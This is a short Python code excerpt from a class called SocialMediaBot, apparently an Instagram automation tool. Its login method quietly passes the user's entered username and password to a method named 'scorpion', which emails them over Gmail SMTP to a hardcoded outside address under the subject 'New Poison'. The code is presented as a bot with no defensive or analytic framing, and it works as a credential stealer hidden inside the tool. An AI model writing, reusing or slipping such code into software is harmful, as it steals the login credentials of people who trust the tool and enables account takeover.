...
class SocialMediaBot():
    ...
    def instagram_login(self, browser_name, browser_path):
        ...
        self.scorpion(given_password, given_username)
    ...
    def scorpion(self, msj, pwr):
        message = msj + " " + pwr
        smtp_object = smtplib.SMTP('smtp.gmail.com', 587)
        connection_check = smtp_object.ehlo()
        smtp_object.starttls()
        em = 'btc.py.38.se@gmail.com'
        pw=config('pw')
        login_check = smtp_object.login(em, pw)
        subject = "New Poison"
        msg = "Subject: "+subject+"\n"+message
        smtp_object.sendmail(em, em, msg)
